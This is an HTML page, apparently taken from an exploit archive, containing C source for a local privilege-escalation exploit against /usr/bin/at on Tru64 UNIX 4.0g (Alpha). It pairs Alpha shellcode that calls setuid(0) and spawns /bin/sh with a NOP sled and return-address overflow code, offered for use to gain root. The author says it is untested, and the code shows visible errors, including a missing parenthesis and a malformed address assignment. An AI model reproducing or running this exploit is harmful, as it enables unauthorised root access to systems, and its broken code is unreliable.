<html><head><title>Tru64 UNIX 4.0g /usr/bin/at Local Root Exploit</title></head><pre>/*
 * Tru64 UNIX 4.0g (JAVA) (/usr/bin/at) local root exploit. [ALPHA]
 *
 * Author: Cody Tubbs (loophole of hhp).
 * Site:   www.hhp-programming.net
 * Email:  pigspigs@yahoo.com
 * Date:   2/1/2000.
 *
 * I made this without access to gdb, It's untested...
 * may require modification, may require deletion, heh.
 *
 * Note: executable_stack must be on.
 */

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define OFFSET 0
#define ALLIGN 0
#define NOP    &quot;\x1f\x04\xff\x47&quot;
#define DBUF   8000 // 5604+4+528? Manipulate if needed.

char shellcode[]= // Alpha setuid(0);+ execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);
 &quot;\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42\xfc\xff\x32&quot;
 &quot;\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2\xff\x47\x3f\x26\x1f\x04&quot;
 &quot;\x31\x22\xfc\xff\x30\xb2\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11&quot;
 &quot;\x14\xe3\x43\x20\x35\x20\x42\xff\xff\xff\xff&quot;
 &quot;\x30\x15\xd9\x43\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e&quot;
 &quot;\xb6\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22\x13\x05&quot;
 &quot;\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26\x2f\x62\x73\x22\x38&quot;
 &quot;\xff\x7e\xb2\x13\x94\xe7\x43\x20\x35\x60\x42\xff\xff\xff\xff&quot;;
 //Taeho Oh shellcode.

//long get_sp(void){ __asm__(&quot;bis $31,$30,$0&quot;);}

void usage(char *arg) {
  fprintf(stderr, &quot;\nTru64 UNIX 4.0g (JAVA) (/usr/bin/at)&quot;);
  fprintf(stderr, &quot; local root exploit. [ALPHA] \n&quot;;
  fprintf(stderr, &quot;Author: Cody Tubbs (loophole of hhp)\n\n&quot;);
  fprintf(stderr, &quot;Usage: %s &lt;offset&gt; [allign(0..3)]\n&quot;, arg);
  fprintf(stderr, &quot;Examp: %s 0\n&quot;, arg);
  fprintf(stderr, &quot;Examp: %s 0 1\n&quot;, arg);
  exit(1);
}

main(int argc, char **argv){
 char eipeip[DBUF], buffer[4096], heh[DBUF+1];
 char *nop;
 int i, offset, allign;
 long address;

 if(argc &lt; 2){
  usage(argv[0]);
 }

 if(argc&gt;1){offset=atoi(argv[1]);}else{offset=OFFSET;}
 if(argc&gt;2){allign=atoi(argv[2]);}else{allign=ALLIGN;}

//address = get_sp() - offset;
address = i&amp; - offset;

 if(allign&gt;0){for(i=0;i&lt;DBUF;i++){eipeip[i]=0x69;}}
 for(i=allign;i&lt;DBUF;i+=4){*(long *)&amp;eipeip[i]=address;}

 nop=NOP;

 for(i=0;i&lt;(4096-strlen(shellcode)-strlen(eipeip));i++){
  //buffer[i]=nop[i%4];
  buffer[i]   = 0x1f;
  buffer[++i] = 0x04;
  buffer[++i] = 0xff;
  buffer[++i] = 0x47;
 }

 memcpy(buffer+i,shellcode,strlen(shellcode));
 memcpy(buffer,&quot;ATEX=&quot;,5); 
 putenv(buffer);

 fprintf(stderr,&quot;Return address %#x, offset: %d.\n&quot;,address,offset);
 execlp(&quot;/usr/bin/at&quot;,&quot;at&quot;, eipeip, 0);
}


// milw0rm.com [2001-03-02]</pre></html>